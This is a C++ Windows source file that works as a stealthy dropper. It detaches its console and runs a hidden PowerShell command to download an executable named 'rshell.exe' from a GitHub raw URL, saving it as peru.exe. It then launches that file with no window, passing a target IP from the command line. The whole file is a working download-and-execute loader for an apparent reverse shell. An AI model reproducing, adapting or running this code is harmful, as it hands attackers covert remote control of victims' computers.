#include <windows.h>
#include <stdio.h>
#include <cstdlib>
#include <string>
#include <tchar.h>
#include <iostream>
// usage: file.exe 127.0.0.1
int main(int argc, char *argv[])
{
    FreeConsole();
    const std::string filename = "peru.exe";
    const std::string command = "powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/addliam/pyterminal/raw/main/garbage/rshell.exe', '" + filename + "')\"";
    const char *downloadcmd = command.c_str();
    // system(downloadcmd);
    const char *url = "https://github.com/addliam/pyterminal/raw/main/garbage/rshell.exe";

    // Download the file
    ShellExecute(NULL, "open", "powershell", downloadcmd, NULL, SW_HIDE);

    // Execute the downloaded file
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    TCHAR cmd[] = _T("peru.exe");
    TCHAR additionalArg[MAX_PATH];
    // Si se proporciona un argumento adicional
    if (argc > 1)
    {
        strcat_s(cmd, MAX_PATH, " ");
        strcpy_s(additionalArg, MAX_PATH, argv[1]);
        strcat_s(cmd, MAX_PATH, additionalArg);
    }
    // Modify the STARTUPINFO to hide the window
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    // Start the child process.
    if (!CreateProcess(NULL,             // No module name (use command line)
                       cmd,              // Command line
                       NULL,             // Process handle not inheritable
                       NULL,             // Thread handle not inheritable
                       FALSE,            // Set handle inheritance to FALSE
                       CREATE_NO_WINDOW, // No creation flags
                       NULL,             // Use parent's environment block
                       NULL,             // Use parent's starting directory
                       &si,              // Pointer to STARTUPINFO structure
                       &pi)              // Pointer to PROCESS_INFORMATION structure
    )
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }
    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);
    // Close process and thread handles.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
